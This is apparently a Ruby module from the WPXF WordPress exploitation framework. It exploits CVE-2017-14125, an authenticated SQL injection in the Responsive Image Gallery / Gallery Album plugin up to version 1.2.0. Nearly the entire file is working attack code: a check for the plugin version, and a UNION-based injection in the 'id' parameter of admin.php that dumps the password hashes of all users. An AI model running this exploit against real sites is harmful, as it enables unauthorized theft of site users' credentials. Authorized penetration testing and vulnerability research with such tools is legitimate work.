# frozen_string_literal: true

class Wpxf::Auxiliary::GalleryAlbumHashDump < Wpxf::Module
  include Wpxf::WordPress::HashDump

  def initialize
    super

    update_info(
      name: 'Responsive Image Gallery, Gallery Album <= 1.2.0 Authenticated Hash Dump',
      desc: %(
        Responsive Image Gallery, Gallery Album <= 1.2.0 contains an SQL injection vulnerability
        which can be leveraged by all registered users with the permission
        to manage the plugin settings. This module utilises this vulnerability
        to dump the hashed passwords of all users in the database.
      ),
      author: [
        'Manuel Garcia Cardenas', # Disclosure
        'rastating'               # WPXF module
      ],
      references: [
        ['WPVDB', '8907'],
        ['CVE', '2017-14125'],
        ['URL', 'http://seclists.org/fulldisclosure/2017/Sep/55']
      ],
      date: 'Sep 22 2017'
    )
  end

  def check
    check_plugin_version_from_readme('gallery-album', '1.2.1')
  end

  def requires_authentication
    true
  end

  def reveals_one_row_per_request
    true
  end

  def hashdump_request_params
    {
      'page' => 'wpdevart_gallery_themes',
      'task' => 'add_edit_theme',
      'id' => "-#{Utility::Text.rand_numeric(3)} UNION #{hashdump_sql_statement}--"
    }
  end

  def hashdump_visible_field_index
    1
  end

  def hashdump_number_of_cols
    4
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'admin.php')
  end
end
